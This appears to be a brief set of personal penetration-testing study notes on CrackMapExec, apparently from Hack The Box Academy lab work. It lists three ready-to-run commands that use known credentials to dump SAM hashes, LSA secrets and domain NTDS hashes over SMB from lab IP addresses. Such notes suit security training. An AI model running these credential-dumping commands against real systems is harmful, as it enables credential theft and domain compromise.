---
description: Best tool for AD/SAM/LSASS
---

# 💓 CrackMapExec

helpful when we have base shell/local shell creds

## Remote Dumping SAM & LSA Secrets

{% code overflow="wrap" %}
```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
{% endcode %}

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Dumping NTDS hashes

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

we can dump ntds hashes with it
